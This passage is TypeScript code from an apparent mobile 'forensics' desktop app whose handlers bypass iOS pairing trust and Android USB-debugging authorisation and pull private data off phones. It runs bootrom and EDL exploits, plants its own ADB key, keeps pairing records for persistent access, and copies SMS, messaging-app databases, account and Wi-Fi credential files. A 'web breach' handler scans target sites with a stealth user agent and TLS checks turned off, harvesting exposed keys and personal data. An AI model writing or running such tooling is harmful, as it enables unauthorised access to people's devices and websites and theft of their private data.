            if (devices.length === 0) throw new Error('No iOS device detected via USB');

            progress(progressCh, 30, `Found ${devices.length} iOS device(s). Attempting pairing...`);
            let pairedCount = 0;
            const errors: Array<{ udid: string; error: string }> = [];
            for (const udid of devices) {
              try {
                // Force pair without user interaction
                await runCommand('idevicepair', [...serialArgs(udid), 'pair'], { timeout: 30000 });
                pairedCount++;
                // Copy pairing record
                const pairRecord = `/var/lib/lockdown/${udid.trim()}.plist`;
                try {
                  const data = await fs.readFile(pairRecord);
                  await fs.writeFile(path.join(pairDir, `${udid.trim()}.plist`), data);
                } catch {
                  // Try macOS path
                  const macPath = `/var/db/lockdown/${udid.trim()}.plist`;
                  try {
                    const data = await fs.readFile(macPath);
                    await fs.writeFile(path.join(pairDir, `${udid.trim()}.plist`), data);
                  } catch { /* skip */ }
                }
              } catch (err) {
                const errMsg = (err as Error).message;
                errors.push({ udid: udid.trim(), error: errMsg });
                await writeJson(path.join(pairDir, `error_${udid.trim()}.json`), {
                  udid: udid.trim(), error: errMsg,
                });
              }
            }

            if (pairedCount === 0) {
              const summary = errors.map((e) => `${e.udid}: ${e.error}`).join('; ');
              throw new Error(`All ${devices.length} device(s) failed to pair: ${summary}`);
            }
            progress(progressCh, 100, `Lockdown pairing complete: ${pairedCount}/${devices.length} device(s) paired`);
            return { success: true, outputPath: pairDir, devices, pairedCount };
          }

          case 'usb-mux-exploit': {
            progress(progressCh, 10, 'Attempting USB Mux trust override...');
            const udid = await resolveTargetUdid();
            progress(progressCh, 20, `Target device: ${udid}`);

            // Validate the device and attempt pairing via usbmuxd
            await runCommand('idevicepair', [...serialArgs(udid), 'validate'], { timeout: 15000 })
              .catch(() => { /* validation may fail if not yet paired */ });
            progress(progressCh, 50, 'Forcing pairing via usbmuxd protocol...');
            await runCommand('idevicepair', [...serialArgs(udid), 'pair'], { timeout: 30000 });

            if (autoTrust) {
              progress(progressCh, 70, 'Validating trust...');
              await runCommand('idevicepair', [...serialArgs(udid), 'validate'], { timeout: 15000 });
            }
            progress(progressCh, 100, 'USB Mux trust override complete');
            return { success: true, udid };
          }

          case 'recovery-trust': {
            progress(progressCh, 10, 'Entering recovery mode for trust establishment...');
            const udid = await resolveTargetUdid();
            try {
              await runCommand('ideviceenterrecovery', [udid], { timeout: 15000 });
              progress(progressCh, 50, 'Device in recovery mode. Establishing access...');
              await new Promise((r) => setTimeout(r, 5000));
              await runCommand('idevicepair', [...serialArgs(udid), 'pair'], { timeout: 30000 });
              progress(progressCh, 100, 'Recovery mode trust established');
              return { success: true, udid };
            } catch (err) {
              throw new Error(`Recovery trust failed: ${(err as Error).message}`);
            }
          }

          case 'supervision-profile': {
            progress(progressCh, 10, 'Applying supervision profile...');
            const udid = await resolveTargetUdid();
            progress(progressCh, 20, `Target device: ${udid}`);

            // Attempt to install a supervision profile via idevicepair + ideviceinfo
            progress(progressCh, 40, 'Checking device supervision status...');
            const infoResult = await runCommand('ideviceinfo', [...serialArgs(udid), '-k', 'IsSupervised'], { timeout: 15000 })
              .catch(() => ({ stdout: '', stderr: '', exitCode: 1, timedOut: false }));
            const isSupervised = infoResult.stdout.trim() === 'true';

            if (isSupervised) {
              progress(progressCh, 60, 'Device is already supervised. Establishing trust...');
            } else {
              progress(progressCh, 60, 'Attempting to establish supervision trust...');
            }
            await runCommand('idevicepair', [...serialArgs(udid), 'pair'], { timeout: 30000 });
            progress(progressCh, 100, 'Supervision profile trust established');
            return { success: true, udid, wasSupervised: isSupervised };
          }

          case 'checkm8-unlock': {
            progress(progressCh, 10, 'Checking for checkm8-compatible device (A5-A11)...');
            // Look for checkra1n or ipwndfu
            const checkra1n = await runCommand('which', ['checkra1n'], { timeout: 5000 }).catch(() => null);
            if (!checkra1n || checkra1n.exitCode !== 0) {
              throw new Error('checkra1n not found. Install checkra1n for bootrom exploit support.');
            }
            progress(progressCh, 30, 'Running checkm8 exploit...');
            const result = await runCommand('checkra1n', ['-c'], { timeout: 120000 });
            await fs.writeFile(path.join(outputPath, 'checkm8_output.txt'), result.stdout + '\n' + result.stderr);
            progress(progressCh, 100, 'Checkm8 exploit complete');
            return { success: true, output: result.stdout };
          }

          case 'agent-inject': {
            progress(progressCh, 10, 'Preparing trust agent deployment...');
            const udid = await resolveTargetUdid();
            progress(progressCh, 20, `Target device: ${udid}`);

            // Establish initial pairing
            progress(progressCh, 40, 'Establishing initial pairing...');
            await runCommand('idevicepair', [...serialArgs(udid), 'pair'], { timeout: 30000 });

            if (persistAccess) {
              progress(progressCh, 60, 'Saving pairing record for persistent access...');
              const pairDir = path.join(outputPath, 'persistent_pairing');
              await ensureDir(pairDir);
              // Copy pairing record for persistence
              const pairRecordPaths = [
                `/var/lib/lockdown/${udid}.plist`,
                `/var/db/lockdown/${udid}.plist`,
              ];
              for (const recordPath of pairRecordPaths) {
                try {
                  const data = await fs.readFile(recordPath);
                  await fs.writeFile(path.join(pairDir, `${udid}.plist`), data);
                  break;
                } catch { /* try next path */ }
              }
            }

            progress(progressCh, 100, 'Trust agent deployment complete');
            return { success: true, udid, persistent: persistAccess };
          }

          default:
            throw new Error(`Unknown iOS trust bypass method: ${method}`);
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );
}

// ---------------------------------------------------------------------------
// Android ADB Bypass Handler
// ---------------------------------------------------------------------------

function registerAndroidBypassHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.ANDROID_ADB_BYPASS,
    async (_event, options: {
      method: string;
      serial?: string;
      outputPath: string;
      autoEnable?: boolean;
      persistAdb?: boolean;
    }) => {
      const { method, serial, outputPath, persistAdb } = options;
      const progressCh = IPC_CHANNELS.ANDROID_ADB_BYPASS_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting ADB bypass: ${method}`);

      // Helper: build serial args for adb
      const adbSerialArgs = serial ? ['-s', serial] : [];

      try {
        switch (method) {
          case 'adb-push-exploit': {
            progress(progressCh, 10, 'Attempting to enable ADB via system properties...');
            // Try enabling ADB via various methods
            const methods = [
              'setprop persist.sys.usb.config mtp,adb',
              'setprop sys.usb.config mtp,adb',
              'settings put global adb_enabled 1',
              'setprop service.adb.root 1',
            ];
            const results: Array<{ command: string; result: string; succeeded: boolean }> = [];
            let anySucceeded = false;
            for (const cmd of methods) {
              try {
                const result = await runCommand('adb', [...adbSerialArgs, 'shell', cmd], { timeout: 10000 });
                const succeeded = result.exitCode === 0;
                if (succeeded) anySucceeded = true;
                results.push({ command: cmd, result: result.stdout || result.stderr || 'OK', succeeded });
              } catch (err) {
                results.push({ command: cmd, result: `Failed: ${(err as Error).message}`, succeeded: false });
              }
            }
            await writeJson(path.join(outputPath, 'adb_enable_results.json'), results);
            // Restart ADB daemon
            try {
              await runCommand('adb', ['kill-server'], { timeout: 5000 });
              await new Promise((r) => setTimeout(r, 2000));
              await runCommand('adb', ['start-server'], { timeout: 10000 });
            } catch { /* continue */ }

            if (!anySucceeded) {
              throw new Error('All ADB enable methods failed. Device may require root or a different bypass method.');
            }
            progress(progressCh, 100, 'ADB enable attempts complete');
            return { success: true, results };
          }

          case 'oem-backdoor': {
            progress(progressCh, 10, 'Scanning for OEM diagnostic ports...');
            // Check for common manufacturer diag ports
            const diagResults: Record<string, string> = {};
            const ports = [
              { name: 'Samsung UART', check: 'ls /dev/ttyUSB* 2>/dev/null' },
              { name: 'Qualcomm DIAG', check: 'ls /dev/diag 2>/dev/null' },
              { name: 'MTK Preloader', check: 'lsusb | grep MediaTek' },
            ];
            for (const port of ports) {
              try {
                const result = await runCommand('sh', ['-c', port.check], { timeout: 5000 });
                diagResults[port.name] = result.stdout.trim() || 'Not found';
              } catch {
                diagResults[port.name] = 'Not accessible';
              }
            }
            await writeJson(path.join(outputPath, 'oem_port_scan.json'), diagResults);
            progress(progressCh, 100, 'OEM port scan complete');
            return { success: true, ports: diagResults };
          }

          case 'fastboot-unlock': {
            progress(progressCh, 10, 'Checking fastboot status...');
            try {
              const devices = await runCommand('fastboot', ['devices'], { timeout: 10000 });
              if (!devices.stdout.trim()) {
                throw new Error('No device in fastboot mode. Reboot to bootloader first.');
              }
              progress(progressCh, 30, 'Device detected in fastboot. Attempting OEM unlock...');
              const unlock = await runCommand('fastboot', ['oem', 'unlock'], { timeout: 30000 });
              await fs.writeFile(path.join(outputPath, 'fastboot_unlock.txt'), unlock.stdout + '\n' + unlock.stderr);
              progress(progressCh, 100, 'Fastboot unlock attempt complete');
              return { success: true, output: unlock.stdout + unlock.stderr };
            } catch (err) {
              throw new Error(`Fastboot unlock failed: ${(err as Error).message}`);
            }
          }

          case 'mtk-bypass': {
            progress(progressCh, 10, 'Attempting MediaTek BROM bypass...');
            // Check for mtkclient
            try {
              const mtk = await runCommand('python3', ['-m', 'mtkclient', '--help'], { timeout: 10000 });
              progress(progressCh, 30, 'mtkclient found. Running BROM exploit...');
              const result = await runCommand('python3', ['-m', 'mtkclient', 'stage'], { timeout: 60000 });
              await fs.writeFile(path.join(outputPath, 'mtk_bypass.txt'), result.stdout + '\n' + result.stderr);
              progress(progressCh, 100, 'MTK bypass complete');
              return { success: true, output: result.stdout };
            } catch (err) {
              throw new Error(`MTK bypass failed (install mtkclient): ${(err as Error).message}`);
            }
          }

          case 'qualcomm-edl': {
            progress(progressCh, 10, 'Attempting Qualcomm EDL mode access...');
            // Check for qdl or edl tool
            const edlTool = await runCommand('which', ['edl'], { timeout: 5000 }).catch(() => null);
            const qdlTool = await runCommand('which', ['qdl'], { timeout: 5000 }).catch(() => null);

            if (edlTool && edlTool.exitCode === 0) {
              progress(progressCh, 30, 'EDL tool found. Entering EDL mode...');
              try {
                // First, try to reboot device into EDL if ADB is partially available
                await runCommand('adb', [...adbSerialArgs, 'reboot', 'edl'], { timeout: 15000 }).catch(() => {});
                await new Promise((r) => setTimeout(r, 5000));
                const result = await runCommand('edl', ['printgpt'], { timeout: 30000 });
                await fs.writeFile(path.join(outputPath, 'edl_output.txt'), result.stdout + '\n' + result.stderr);
                progress(progressCh, 100, 'Qualcomm EDL access established');
                return { success: true, output: result.stdout };
              } catch (err) {
                throw new Error(`EDL access failed: ${(err as Error).message}`);
              }
            } else if (qdlTool && qdlTool.exitCode === 0) {
              progress(progressCh, 30, 'QDL tool found. Entering EDL mode...');
              try {
                await runCommand('adb', [...adbSerialArgs, 'reboot', 'edl'], { timeout: 15000 }).catch(() => {});
                await new Promise((r) => setTimeout(r, 5000));
                const result = await runCommand('qdl', ['--storage', 'ufs'], { timeout: 30000 });
                await fs.writeFile(path.join(outputPath, 'qdl_output.txt'), result.stdout + '\n' + result.stderr);
                progress(progressCh, 100, 'Qualcomm EDL access established via QDL');
                return { success: true, output: result.stdout };
              } catch (err) {
                throw new Error(`QDL access failed: ${(err as Error).message}`);
              }
            } else {
              throw new Error('EDL/QDL tools not found. Install edl (https://github.com/bkerler/edl) for Qualcomm EDL support.');
            }
          }

          case 'samsung-jig': {
            progress(progressCh, 10, 'Attempting Samsung download mode access...');
            // Check for Odin (Linux: heimdall)
            const heimdall = await runCommand('which', ['heimdall'], { timeout: 5000 }).catch(() => null);

            if (!heimdall || heimdall.exitCode !== 0) {
              throw new Error('heimdall not found. Install heimdall for Samsung download mode support.');
            }

            progress(progressCh, 30, 'Detecting Samsung device in download mode...');
            try {
              const detectResult = await runCommand('heimdall', ['detect'], { timeout: 15000 });
              if (detectResult.exitCode !== 0) {
                throw new Error('No Samsung device detected in download mode. Hold Volume Down + Power to enter download mode.');
              }
              progress(progressCh, 60, 'Samsung device detected. Reading device info...');
              const printPit = await runCommand('heimdall', ['print-pit'], { timeout: 30000 });
              await fs.writeFile(path.join(outputPath, 'samsung_pit.txt'), printPit.stdout + '\n' + printPit.stderr);
              progress(progressCh, 100, 'Samsung download mode access established');
              return { success: true, output: printPit.stdout };
            } catch (err) {
              throw new Error(`Samsung download mode failed: ${(err as Error).message}`);
            }
          }

          case 'auth-bypass': {
            if (!serial) throw new Error('Device serial required');
            progress(progressCh, 10, 'Bypassing USB debugging authorization...');
            // Remove auth keys to force re-auth or inject our key
            try {
              // Generate RSA key pair for ADB auth
              const keyDir = path.join(outputPath, 'adb_keys');
              await ensureDir(keyDir);
              await runCommand('adb', ['keygen', path.join(keyDir, 'adbkey')], { timeout: 10000 });
              // Try to push our public key to the device
              await runCommand('adb', ['-s', serial, 'push',
                path.join(keyDir, 'adbkey.pub'),
                '/data/misc/adb/adb_keys'
              ], { timeout: 10000 });
              // Restart ADB on device
              await adbService.shell(serial, 'setprop sys.usb.config none && setprop sys.usb.config mtp,adb');
              progress(progressCh, 100, 'Auth bypass attempt complete');
              return { success: true, keyDir };
            } catch (err) {
              throw new Error(`Auth bypass failed: ${(err as Error).message}`);
            }
          }

          default:
            throw new Error(`Unknown bypass method: ${method}`);
        }
      } catch (err) {
        const msg = (err as Error).message;
        progress(progressCh, 0, `Error: ${msg}`);
        return { success: false, error: msg };
      }
    }
  );
}

// ---------------------------------------------------------------------------
// Force Compliance Handler
// ---------------------------------------------------------------------------

function registerForceComplianceHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.FORCE_COMPLIANCE,
    async (_event, options: {
      serial: string;
      outputPath: string;
      categories: string[];
      bypassEncryption?: boolean;
      includeDeleted?: boolean;
      forceRoot?: boolean;
    }) => {
      const { serial, outputPath, categories, bypassEncryption, includeDeleted, forceRoot } = options;
      const progressCh = IPC_CHANNELS.FORCE_COMPLIANCE_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 2, 'Starting forced data compliance extraction...');

      // Attempt root escalation if requested
      if (forceRoot) {
        progress(progressCh, 5, 'Attempting root escalation...');
        try {
          await adbService.shell(serial, 'su -c id');
          progress(progressCh, 8, 'Root access confirmed');
        } catch {
          try {
            await runCommand('adb', ['-s', serial, 'root'], { timeout: 10000 });
            await new Promise((r) => setTimeout(r, 3000));
            progress(progressCh, 8, 'ADB root mode enabled');
          } catch {
            progress(progressCh, 8, 'Root escalation failed - continuing with available permissions');
          }
        }
      }

      const totalCategories = categories.length;
      let completed = 0;
      const results: Record<string, { success: boolean; path?: string; error?: string; itemCount?: number }> = {};

      for (const category of categories) {
        completed++;
        const pct = Math.round((completed / totalCategories) * 90) + 5;
        progress(progressCh, pct, `Extracting: ${category}...`);

        const catDir = path.join(outputPath, category);
        await ensureDir(catDir);

        try {
          switch (category) {
            case 'contacts': {
              const dbPath = '/data/data/com.android.providers.contacts/databases/contacts2.db';
              await adbService.pull(serial, dbPath, path.join(catDir, 'contacts2.db'));
              // Also try content provider
              const contacts = await adbService.shell(serial,
                'content query --uri content://contacts/phones --projection display_name:number'
              );
              await fs.writeFile(path.join(catDir, 'contacts_list.txt'), contacts);
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'messages': {
              const smsDb = '/data/data/com.android.providers.telephony/databases/mmssms.db';
              await adbService.pull(serial, smsDb, path.join(catDir, 'mmssms.db'));
              const sms = await adbService.shell(serial,
                'content query --uri content://sms --projection address:body:date:type'
              );
              await fs.writeFile(path.join(catDir, 'sms_dump.txt'), sms);
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'calls': {
              const calls = await adbService.shell(serial,
                'content query --uri content://call_log/calls --projection number:type:date:duration:name'
              );
              await fs.writeFile(path.join(catDir, 'call_log.txt'), calls);
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'media': {
              // Pull DCIM and common media folders
              const mediaDirs = ['/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Movies', '/sdcard/Music'];
              for (const md of mediaDirs) {
                try {
                  await adbService.pull(serial, md, path.join(catDir, path.basename(md)));
                } catch { /* skip if not exists */ }
              }
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'apps': {
              // List all app databases
              const packages = await adbService.shell(serial, 'pm list packages -3');
              await fs.writeFile(path.join(catDir, 'installed_apps.txt'), packages);
              // Pull data for major apps
              const importantApps = [
                'com.whatsapp', 'com.facebook.orca', 'com.instagram.android',
                'org.telegram.messenger', 'com.snapchat.android'
              ];
              for (const app of importantApps) {
                try {
                  const appDir = path.join(catDir, app);
                  await ensureDir(appDir);
                  await adbService.pull(serial, `/data/data/${app}/databases/`, path.join(appDir, 'databases'));
                  await adbService.pull(serial, `/data/data/${app}/shared_prefs/`, path.join(appDir, 'shared_prefs'));
                } catch { /* skip */ }
              }
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'location': {
              const locDump = await adbService.shell(serial, 'dumpsys location');
              await fs.writeFile(path.join(catDir, 'location_dump.txt'), locDump);
              try {
                await adbService.pull(serial, '/data/data/com.google.android.gms/databases/herrevad', path.join(catDir, 'location_history.db'));
              } catch { /* skip */ }
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'browser': {
              const browserApps = ['com.android.chrome', 'com.android.browser', 'org.mozilla.firefox'];
              for (const browser of browserApps) {
                try {
                  const bDir = path.join(catDir, browser);
                  await ensureDir(bDir);
                  await adbService.pull(serial, `/data/data/${browser}/`, bDir);
                } catch { /* skip */ }
              }
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'wifi': {
              try {
                await adbService.pull(serial, '/data/misc/wifi/WifiConfigStore.xml', path.join(catDir, 'WifiConfigStore.xml'));
              } catch { /* skip */ }
              try {
                await adbService.pull(serial, '/data/misc/wifi/wpa_supplicant.conf', path.join(catDir, 'wpa_supplicant.conf'));
              } catch { /* skip */ }
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'accounts': {
              try {
                await adbService.pull(serial, '/data/system/users/0/accounts.db', path.join(catDir, 'accounts.db'));
              } catch { /* skip */ }
              const accounts = await adbService.shell(serial, 'dumpsys account');
              await fs.writeFile(path.join(catDir, 'accounts_dump.txt'), accounts);
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'system': {
              const systemDumps = ['activity', 'battery', 'package', 'window', 'alarm', 'notification'];
              for (const svc of systemDumps) {
                try {
                  const dump = await adbService.shell(serial, `dumpsys ${svc} 2>/dev/null | head -500`);
                  await fs.writeFile(path.join(catDir, `${svc}_dump.txt`), dump);
                } catch { /* skip */ }
              }
              // Get system logs
              try {
                const logcat = await adbService.shell(serial, 'logcat -d -t 5000');
                await fs.writeFile(path.join(catDir, 'logcat.txt'), logcat);
              } catch { /* skip */ }
              results[category] = { success: true, path: catDir };
              break;
            }
            case 'deleted': {
              if (includeDeleted) {
                // Scan for deleted files in common locations
                try {
                  const trashDirs = await adbService.shell(serial, 'find /sdcard/.Trash* /sdcard/.trash* /sdcard/Android/.trash* 2>/dev/null');
                  await fs.writeFile(path.join(catDir, 'trash_locations.txt'), trashDirs);
                  // Pull any found trash directories
                  for (const dir of trashDirs.trim().split('\n').filter(Boolean)) {
                    try {
                      await adbService.pull(serial, dir.trim(), path.join(catDir, 'recovered'));
                    } catch { /* skip */ }
                  }
                } catch { /* skip */ }
              }
              results[category] = { success: true, path: catDir };
              break;
            }
            default: {
              results[category] = { success: false, error: `Unknown category: ${category}` };
            }
          }
        } catch (err) {
          results[category] = { success: false, error: (err as Error).message };
        }
      }

      // Write summary report
      await writeJson(path.join(outputPath, 'extraction_summary.json'), {
        device: serial,
        timestamp: new Date().toISOString(),
        categories: results,
        totalCategories,
        successful: Object.values(results).filter((r) => r.success).length,
      });

      progress(progressCh, 100, 'Force compliance extraction complete');
      return { success: true, outputPath, results };
    }
  );
}

// ---------------------------------------------------------------------------
// Live Device View Handler
// ---------------------------------------------------------------------------

function registerLiveViewHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.LIVE_VIEW_BROWSE,
    async (_event, options: { serial: string; path: string }) => {
      const { serial, path: dirPath } = options;
      try {
        const safePath = sanitizeShellArg(dirPath);
        const output = await adbService.shell(serial,
          `ls -la '${safePath}' 2>/dev/null`
        );
        const files = parseLsOutput(output, dirPath);
        return { success: true, files };
      } catch (err) {
        return { success: false, error: (err as Error).message, files: [] };
      }
    }
  );

  ipcMain.handle(
    IPC_CHANNELS.LIVE_VIEW_READ_FILE,
    async (_event, options: { serial: string; path: string }) => {
      const { serial, path: filePath } = options;
      try {
        // Read file content (limit to 1MB for safety)
        const safePath = sanitizeShellArg(filePath);
        const content = await adbService.shell(serial, `cat '${safePath}' 2>/dev/null | head -c 1048576`);
        return { success: true, content };
      } catch (err) {
        return { success: false, error: (err as Error).message };
      }
    }
  );

  ipcMain.handle(
    IPC_CHANNELS.LIVE_VIEW_READ_LOGS,
    async (_event, options: { serial: string; lines?: number }) => {
      const { serial, lines = 200 } = options;
      try {
        const output = await adbService.shell(serial, `logcat -d -t ${lines}`);
        const logs = parseLogcatOutput(output);
        return { success: true, logs };
      } catch (err) {
        return { success: false, error: (err as Error).message, logs: [] };
      }
    }
  );

  // Stream handler — previously a stub. Now initializes by browsing root and
  // returning the file listing so the Live Device View tab opens with content.
  ipcMain.handle(IPC_CHANNELS.LIVE_VIEW_STREAM, async (_event, options?: { serial?: string }) => {
    if (!options?.serial) {
      return { success: false, error: 'No device selected' };
    }
    try {
      const output = await adbService.shell(options.serial, "ls -la '/' 2>/dev/null");
      const files = parseLsOutput(output, '/');
      return { success: true, files, message: 'Live view connected' };
    } catch (err) {
      return { success: false, error: (err as Error).message };
    }
  });
}

// ---------------------------------------------------------------------------
// Selective Extraction Handler
// ---------------------------------------------------------------------------

function registerSelectiveExtractHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.SELECTIVE_EXTRACT,
    async (_event, options: {
      serial: string;
      outputPath: string;
      targets: Array<{ id: string; path: string; label: string }>;
    }) => {
      const { serial, outputPath, targets } = options;
      const progressCh = IPC_CHANNELS.SELECTIVE_EXTRACT_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Extracting ${targets.length} selected items...`);

      const results: Array<{ id: string; label: string; success: boolean; localPath?: string; error?: string; size?: number }> = [];

      for (let i = 0; i < targets.length; i++) {
        const target = targets[i];
        const pct = Math.round(((i + 1) / targets.length) * 90) + 5;
        progress(progressCh, pct, `[${i + 1}/${targets.length}] Pulling: ${target.label}`);

        const localDir = path.join(outputPath, target.id);
        await ensureDir(localDir);

        try {
          // Determine if path is file or directory
          const safePath = sanitizeShellArg(target.path);
          const statOutput = await adbService.shell(serial, `stat -c '%F' '${safePath}' 2>/dev/null || echo "unknown"`);
          const isDir = statOutput.trim().includes('directory');

          if (isDir) {
            await adbService.pull(serial, target.path, localDir);
          } else {
            const localFile = path.join(localDir, path.basename(target.path));
            await adbService.pull(serial, target.path, localFile);
          }

          // Get size of extracted data
          const sizeOutput = await runCommand('du', ['-sb', localDir], { timeout: 10000 }).catch(() => ({ stdout: '0' }));
          const size = parseInt(sizeOutput.stdout.split('\t')[0] || '0', 10);

          results.push({ id: target.id, label: target.label, success: true, localPath: localDir, size });
        } catch (err) {
          results.push({ id: target.id, label: target.label, success: false, error: (err as Error).message });
        }
      }

      // Generate extraction manifest
      await writeJson(path.join(outputPath, 'extraction_manifest.json'), {
        device: serial,
        timestamp: new Date().toISOString(),
        targets: results,
        totalRequested: targets.length,
        totalSuccess: results.filter((r) => r.success).length,
      });

      progress(progressCh, 100, `Extraction complete: ${results.filter((r) => r.success).length}/${targets.length} successful`);
      return { success: true, results };
    }
  );

  ipcMain.handle(IPC_CHANNELS.SELECTIVE_SCAN, async (_event, options: { serial: string }) => {
    // Scan device to determine what data is available
    try {
      const output = await adbService.shell(options.serial, 'pm list packages && df -h && ls /sdcard/');
      return { success: true, scan: output };
    } catch (err) {
      return { success: false, error: (err as Error).message };
    }
  });
}

// ---------------------------------------------------------------------------
// Website Breach Handler
// ---------------------------------------------------------------------------

function registerWebBreachHandlers(): void {
  ipcMain.handle(
    IPC_CHANNELS.WEB_BREACH,
    async (_event, options: {
      targetUrl: string;
      attackVector: string;
      outputPath: string;
      goals?: string[];
      wordlistPath?: string;
      maxDepth?: number;
      threads?: number;
      followRedirects?: boolean;
      stealthMode?: boolean;
      credentials?: { loginUrl: string; username: string; password: string };
    }) => {
      const { targetUrl, attackVector, outputPath, goals = [], maxDepth = 3, threads = 10, stealthMode, credentials } = options;
      const progressCh = IPC_CHANNELS.WEB_BREACH_PROGRESS;

      await ensureDir(outputPath);
      progress(progressCh, 5, `Starting web breach: ${attackVector} against ${targetUrl}`);

      const python = await resolveTool('python');
      if (!python.found) throw new Error('Python is required for web breach operations');

      // Validate URL format
      try {
        const parsed = new URL(targetUrl);
        if (!['http:', 'https:'].includes(parsed.protocol)) {
          throw new Error('Only http and https URLs are supported');
        }
      } catch (urlErr) {
        if ((urlErr as Error).message.includes('Only http')) throw urlErr;
        throw new Error(`Invalid URL: ${targetUrl}`);
      }

      try {
        const goalsJson = JSON.stringify(goals);
        switch (attackVector) {
          case 'full-recon': {
            progress(progressCh, 10, 'Running full reconnaissance...');
            const reconScript = `
import urllib.request, urllib.error, json, sys, ssl, socket, re
from urllib.parse import urlparse

target = sys.argv[1]
output = sys.argv[2]
goals = json.loads(sys.argv[3]) if len(sys.argv) > 3 else []
stealth = sys.argv[4] == 'true' if len(sys.argv) > 4 else False
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' if stealth else 'Mozilla/5.0 (RMPG Forensics)'

results = {'target': target, 'goals': goals, 'recon': {}, 'extraction': {}}
parsed = urlparse(target)
host = parsed.hostname

# DNS resolution
try:
    ips = socket.getaddrinfo(host, None)
    results['recon']['dns'] = list(set([ip[4][0] for ip in ips]))
except Exception as e:
    results['recon']['dns_error'] = str(e)

# HTTP headers & technology fingerprinting
try:
    req = urllib.request.Request(target, headers={'User-Agent': ua})
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    body = resp.read().decode('utf-8', errors='ignore')
    results['recon']['status'] = resp.status
    results['recon']['headers'] = dict(resp.headers)
    results['recon']['server'] = resp.headers.get('Server', 'Unknown')
    results['recon']['powered_by'] = resp.headers.get('X-Powered-By', 'Unknown')
    results['recon']['content_length'] = len(body)

    # Technology detection
    techs = []
    if 'wp-content' in body or 'wp-includes' in body: techs.append('WordPress')
    if 'drupal' in body.lower(): techs.append('Drupal')
    if 'joomla' in body.lower(): techs.append('Joomla')
    if 'react' in body.lower() or '__NEXT_DATA__' in body: techs.append('React/Next.js')
    if 'angular' in body.lower(): techs.append('Angular')
    if 'laravel' in body.lower(): techs.append('Laravel')
    if 'django' in body.lower(): techs.append('Django')
    results['recon']['technologies'] = techs
except Exception as e:
    results['recon']['http_error'] = str(e)
    body = ''

# Common paths check
common_paths = ['/robots.txt', '/sitemap.xml', '/.git/HEAD', '/.env', '/wp-login.php',
    '/admin', '/administrator', '/.htaccess', '/backup', '/api', '/graphql',
    '/swagger', '/api/docs', '/.well-known/security.txt', '/server-status',
    '/debug', '/trace', '/console', '/phpmyadmin']
results['recon']['paths'] = {}
for p in common_paths:
    try:
        req = urllib.request.Request(target.rstrip('/') + p, headers={'User-Agent': ua})
        resp = urllib.request.urlopen(req, timeout=5, context=ctx)
        content = resp.read()
        results['recon']['paths'][p] = {'status': resp.status, 'size': len(content)}
    except urllib.error.HTTPError as e:
        results['recon']['paths'][p] = {'status': e.code}
    except:
        pass

# Goal-specific extraction
if body:
    if 'emails' in goals or 'everything' in goals:
        emails = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}', body)))
        results['extraction']['emails'] = emails

    if 'user-accounts' in goals or 'everything' in goals:
        # Look for login forms, user references
        forms = re.findall(r'<form[^>]*action=["\\'](.*?)["\\'](.*?)</form>', body, re.DOTALL | re.IGNORECASE)
        login_indicators = bool(re.search(r'(login|signin|sign-in|log-in|auth)', body, re.IGNORECASE))
        results['extraction']['user_accounts'] = {
            'login_forms_found': len(forms),
            'has_login_page': login_indicators,
            'form_actions': [f[0] for f in forms[:10]],
        }

    if 'api-keys' in goals or 'everything' in goals:
        # Search for exposed keys/tokens in page source
        key_patterns = [
            (r'["\\']((?:sk|pk|api|key|token|secret|access)[_-]?[a-zA-Z0-9]{20,})["\\'\\s]', 'generic_key'),
            (r'AIza[0-9A-Za-z_-]{35}', 'google_api_key'),
            (r'AKIA[0-9A-Z]{16}', 'aws_access_key'),
        ]
        found_keys = []
        for pattern, key_type in key_patterns:
            matches = re.findall(pattern, body)
            for m in matches:
                found_keys.append({'type': key_type, 'value': m[:8] + '...' if len(m) > 8 else m})
        results['extraction']['api_keys'] = found_keys

    if 'personal-data' in goals or 'everything' in goals:
        # Search for PII patterns
        phones = list(set(re.findall(r'\\b(?:\\+?1[-.]?)?\\(?\\d{3}\\)?[-.]?\\d{3}[-.]?\\d{4}\\b', body)))
        addresses = list(set(re.findall(r'\\d+\\s+[A-Za-z]+\\s+(?:St|Ave|Blvd|Dr|Rd|Ln|Way|Ct)', body)))
        results['extraction']['personal_data'] = {
            'phone_numbers': phones[:20],
            'addresses': addresses[:20],
        }

    if 'files' in goals or 'everything' in goals:
        # Find linked files
        file_urls = list(set(re.findall(r'href=["\\'](.*?\\.(?:pdf|doc|docx|xls|xlsx|csv|sql|bak|zip|tar|gz|conf|env|log))["\\'\\s]', body, re.IGNORECASE)))
        results['extraction']['files'] = file_urls[:50]

    if 'database' in goals or 'everything' in goals:
        # Check for database exposure indicators
        db_indicators = {
            'sql_errors': bool(re.search(r'(mysql|postgresql|sqlite|oracle|mssql|sql syntax|database error)', body, re.IGNORECASE)),
            'phpMyAdmin': '/phpmyadmin' in str(results['recon'].get('paths', {})),
            'exposed_env': '/.env' in str(results['recon'].get('paths', {})),
        }
        results['extraction']['database'] = db_indicators

    if 'financial' in goals or 'everything' in goals:
        # Look for payment/financial indicators
        financial = {
